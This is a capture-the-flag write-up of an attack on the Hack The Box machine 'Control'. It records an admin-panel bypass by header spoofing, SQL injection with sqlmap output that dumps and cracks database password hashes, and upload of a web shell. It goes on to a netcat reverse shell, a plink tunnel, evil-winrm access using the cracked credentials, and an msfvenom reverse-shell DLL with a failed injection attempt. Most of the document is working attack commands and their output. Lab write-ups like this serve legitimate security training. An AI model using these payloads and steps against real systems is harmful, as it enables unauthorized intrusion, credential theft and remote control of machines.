# Control
Note: I've been many days with this box, and however, I didn't get root. It's been so hard for me to researching as things as I need. I got some necessary nudges, but it means I've improved a lot for next boxes :) 
Thank yoy community, for helping me with this.

## NMAP
Port 80 IIS
Port 135 RPC
Port 3306 MariaDB

We begin with some opened ports, let's start with the HTTP service:

## Web Service
Important comment:
```
 id="page-wrapper">
		<!-- To Do:
			- Import Products
			- Link to new payment system
			- Enable SSL (Certificates location \\192.168.4.28\myfiles)
		<!-- Header -->
```



If we click on Admin tab, we get the next error: "Access Denied: Header Missing. Please ensure you go through the proxy to access this page"
Also there are some js script to review in "/assets/js/checkValues.js" and "/assets/js/functions.js"

## Burp Suite

For spoof a proxy, we must add the "X-Forwarded-For" header to our request, so let's do it with burp:
Sent:
```
POST /admin.php HTTP/1.1
Host: 10.10.10.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.167/about.php
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.4.28
Content-Length: 0
```


We are now in admin panel.

Let's notice that searchbox have SQLi, because we got all items by typing
```
' OR '1'='1
```

With an union attack, it gives "Error: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
" error until we got 6 items: 

```
Request: ' union all select null, null, null, null, null, null; -- 

Response:  Error: SQLSTATE[HY000]: General error

```


Let's run sqlmap for saving time:

```
sqlmap --proxy=http://127.0.0.1:8080 --data=productName=16 -u http://10.10.10.167/search_products.php --schema

```

Into the "warehouse" DB (actually, our current DB), we have 3 tables:

```
[3 tables]
+------------------+
| product          |
| product_category |
| product_pack     |
+------------------+
```

Current user: manager@localhost

With the --passwords flag, it get some user:passwords of the db:

```

kali@kali:~$ sqlmap --proxy=http://127.0.0.1:8080 --data=productName=16 -u http://10.10.10.167/search_products.php --passwords
        ___
       __H__                                                                                                       
 ___ ___[.]_____ ___ ___  {1.4#stable}                                                                             
|_ -| . [,]     | .'| . |                                                                                          
|___|_  [)]_|_|_|__,|  _|                                                                                          
      |_|V...       |_|   http://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:50:52 /2020-04-24/

[17:50:52] [INFO] resuming back-end DBMS 'mysql' 
[17:50:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-2040' OR 1557=1557#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=16' AND (SELECT 4997 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(4997=4997,1))),0x716b7a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sxcB

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: productName=16';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=16' AND (SELECT 4567 FROM (SELECT(SLEEP(5)))hRhs)-- bOGr

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=16' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766a71,0x71686242474a6c66494c6e4d5564417659566e4867534758516964765773466261785943534e7864,0x716b7a7671),NULL,NULL#
---
[17:50:52] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[17:50:52] [INFO] fetching database users password hashes
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] 
[17:51:05] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files

[17:51:18] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] 
[17:51:21] [INFO] starting dictionary-based cracking (mysql_passwd)
[17:51:21] [INFO] starting 4 processes 
[17:51:30] [INFO] cracked password 'l3tm3!n' for user 'manager'                                                   
database management system users password hashes:                                                                 
[*] hector [1]:
    password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
[*] manager [1]:
    password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
    clear-text password: l3tm3!n
[*] root [1]:
    password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8

[17:51:43] [INFO] fetched data logged to text files under '/home/kali/.sqlmap/output/10.10.10.167'
[17:51:43] [WARNING] you haven't updated sqlmap for more than 114 days!!!

[*] ending @ 17:51:43 /2020-04-24/

```

Got manager password. Now, with the help of https://crackstation.net/, we discover that hector password is "l33th4x0rhector". There's no lucky with the root one.

Let's upload a webshell with sqlmap. I'm going to use "p0wny-shell.php" for this, and I supposse they left the default root for IIS (https://stackoverflow.com/questions/10779488/cannot-verify-access-to-path-c-inetpub-wwwroot-when-adding-a-virtual-direc)

```
kali@kali:~$ sqlmap --proxy=http://127.0.0.1:8080 --data=productName=16 -u http://10.10.10.167/search_products.php --file-dest="/Inetpub/wwwroot/p0wny.php" --file-write="/home/kali/CTFs/library/WebShells/p0wny-shell-master/shell.php"
        ___
       __H__                                                                                                                                               
 ___ ___[(]_____ ___ ___  {1.4#stable}                                                                                                                     
|_ -| . ["]     | .'| . |                                                                                                                                  
|___|_  [,]_|_|_|__,|  _|                                                                                                                                  
      |_|V...       |_|   http://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:17:01 /2020-04-24/

[18:17:01] [INFO] resuming back-end DBMS 'mysql' 
[18:17:01] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-2040' OR 1557=1557#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=16' AND (SELECT 4997 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(4997=4997,1))),0x716b7a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sxcB

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: productName=16';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=16' AND (SELECT 4567 FROM (SELECT(SLEEP(5)))hRhs)-- bOGr

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=16' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766a71,0x71686242474a6c66494c6e4d5564417659566e4867534758516964765773466261785943534e7864,0x716b7a7671),NULL,NULL#
---
[18:17:02] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[18:17:02] [INFO] fingerprinting the back-end DBMS operating system
[18:17:02] [INFO] the back-end DBMS operating system is Windows
[18:17:02] [WARNING] potential permission problems detected ('Access denied')
[18:17:16] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                            
do you want confirmation that the local file '/home/kali/CTFs/library/WebShells/p0wny-shell-master/shell.php' has been successfully written on the back-end DBMS file system ('/Inetpub/wwwroot/p0wny.php')? [Y/n] 
[18:17:25] [INFO] the local file '/home/kali/CTFs/library/WebShells/p0wny-shell-master/shell.php' and the remote file '/Inetpub/wwwroot/p0wny.php' have the same size (15744 B)
[18:17:26] [INFO] fetched data logged to text files under '/home/kali/.sqlmap/output/10.10.10.167'
[18:17:26] [WARNING] you haven't updated sqlmap for more than 114 days!!!

[*] ending @ 18:17:26 /2020-04-24/


```
Note: Also works using --headers instead of --proxy:
```
sqlmap --data=productName=16 --headers="X-Forwarded-For: 192.168.4.28" -u http://10.10.10.167/search_products.php --file-dest="/Inetpub/wwwroot/p0wny.php" --file-write="/home/kali/CTFs/library/WebShells/p0wny-shell-master/shell.php"
```
Now, let's go to http://10.10.10.167/p0wny.php and get access:

```

        ___                         ____      _          _ _        _  _   
 _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ 
| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|
| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|
| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  
|_|                         |___/  \____/                                  
                

            

p0wny@shell:C:\inetpub\wwwroot# whoami
nt authority\iusr
```

iusr seems to be an IIS user with low privileges. Let's Privesc!
No prob, let's upload a nc, using also sqlmap, and make a reverse shell

In our machine:
```
kali@kali:/var/www/html$ sudo nc -nlvp 1999
listening on [any] 1999 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.167] 52191
Microsoft Windows [Version 10.0.17763.805]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot>whoami
whoami
nt authority\iusr

C:\inetpub\wwwroot>
```

In victim's machine:
```
>> nc.exe 10.10.14.16 1999 -e cmd.exe
```

Let's work now softly.

Tried PowerUp.ps1 but didn't work.https://github.com/Hackplayers/evil-winrm

Running a "netcat -ano" is a good way to see active connections:

```
C:\inetpub\wwwroot>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       784
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1892
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       456
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       344
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       952
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1760
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       600
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       584
  TCP    10.10.10.167:80        10.10.14.17:48838      ESTABLISHED     4
  TCP    10.10.10.167:80        10.10.14.17:48840      ESTABLISHED     4
  TCP    10.10.10.167:52189     10.10.14.17:1999       CLOSE_WAIT      2936
  TCP    10.10.10.167:52191     10.10.14.17:1999       ESTABLISHED     2548
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       784
  TCP    [::]:3306              [::]:0                 LISTENING       1892
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       456
  TCP    [::]:49665             [::]:0                 LISTENING       344
  TCP    [::]:49666             [::]:0                 LISTENING       952
  TCP    [::]:49667             [::]:0                 LISTENING       1760
  TCP    [::]:49668             [::]:0                 LISTENING       600
  TCP    [::]:49669             [::]:0                 LISTENING       584
  UDP    0.0.0.0:123            *:*                                    1996
  UDP    0.0.0.0:5353           *:*                                    1228
  UDP    0.0.0.0:5355           *:*                                    1228
  UDP    0.0.0.0:53864          *:*                                    1228
  UDP    0.0.0.0:63928          *:*                                    1228
  UDP    127.0.0.1:54535        *:*                                    952
  UDP    [::]:123               *:*                                    1996
  UDP    [::]:5353              *:*                                    1228
  UDP    [::]:5355              *:*                                    1228
  UDP    [::]:53864             *:*                                    1228
  UDP    [::]:63928             *:*                                    1228
```

5985 port is a new one for us,not given by nmap, the WinRM onw (https://www.speedguide.net/port.php?port=5985). We could try to enter using plink
For this, we need to enable ssh connections in our machine, and execute this command in the victim's:
```
plink.exe -l kali -R 5985:127.0.0.1:5985 10.10.14.17
```
Note: It'll asks for our user credential.

```
C:\inetpub\wwwroot>plink -l kali -R 5985:127.0.0.1:5985 10.10.14.17
plink -l kali -R 5985:127.0.0.1:5985 10.10.14.17
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's ssh-ed25519 key fingerprint is:
ssh-ed25519 255 2b:90:c5:fe:b9:b8:b0:4c:85:f1:28
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n) y
Using username "kali".
kali@10.10.14.17's password: ****

Linux kali 5.4.0-kali3-amd64 #1 SMP Debian 5.4.13-1kali1 (2020-01-20) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
kali@kali:~$ 
```

Now, we can use evil-winrm: https://github.com/Hackplayers/evil-winrm

For installing it, the easy way is:
```
sudo gem install evil-winrm
```
Now, launch it!
```
kali@kali:~/Downloads/evil-winrm-master$ ruby evil-winrm.rb -i 127.0.0.1 -u hector -p l33th4x0rhector

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Hector\Documents> whoami
control\hector

```

## Getting Root

As Hector, let's execute winPEAS.bat. You can see the complete log in "winPEAS.log".
The important things I've viewed are:

"C:\Users\Hector\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" with this content:

```
*Evil-WinRM* PS C:\Users\Hector\appdata\roaming\microsoft\Windows\Powershell\PSReadline> type consolehost_history.txt
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
```

This service also appears in the log:
```
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents
    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion

```
So let's see what Hector saw:
```
*Evil-WinRM* PS C:\inetpub\wwwroot> get-childitem HKLM:\SYSTEM\CurrentControlset | format-list


Property      : {BootDriverFlags, CurrentUser, EarlyStartServices, PreshutdownOrder...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Control
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 121
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 11
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control

Property      : {NextParentID.daba3ff.2, NextParentID.61aaa01.3, NextParentID.1bd7f811.4, NextParentID.2032e665.5...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Enum
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 17
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 27
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Hardware Profiles
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 3
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Policies
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 0
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Services
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 667
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Software
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 1
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
```

The second one seems way more interesting, because it might give be the key:
```
*Evil-WinRM* PS C:\Users\Hector\appdata\roaming\microsoft\Windows\Powershell\PSReadline> get-acl HKLM:\SYSTEM\CurrentControlSet | format-list


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\Authenticated Users Allow  -2147483648
         S-1-5-32-549 Allow  ReadKey
         S-1-5-32-549 Allow  -2147483648
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  -2147483648
Audit  :
Sddl   : O:BAG:SYD:AI(A;;KA;;;BA)(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;KR;;;SO)(A;CIIOID;GR;;;SO)(A;ID;KA;;;BA)(A;CIIOID;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-3-1024-1065365936-12
         81604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)

```

I think I'm so close, but it's 18:35 and, in 25 minutes, this box is gonna be retired. Also, my dll injection is yet too many poor, so I leave it here.
Some other things I do:

Created dll using msfvenom
```
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=6666 -f dll -o msf.dll
/usr/share/rubygems-integration/all/gems/bundler-1.17.3/lib/bundler/rubygems_integration.rb:200: warning: constant Gem::ConfigMap is deprecated
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of dll file: 5120 bytes
Saved as: msf.dll
```
Copied PowerSploit for trying to inject that dll into some proccess, for testing, but..
*Evil-WinRM* PS C:\inetpub\wwwroot> Import-Module .\AntivirusBypass.psd1
*Evil-WinRM* PS C:\inetpub\wwwroot> Import-Module .\Invoke-DllInjection.ps1
At C:\inetpub\wwwroot\Invoke-DllInjection.ps1:1 char:1
+ function Invoke-DllInjection
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At C:\inetpub\wwwroot\Invoke-DllInjection.ps1:1 char:1
+ function Invoke-DllInjection
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
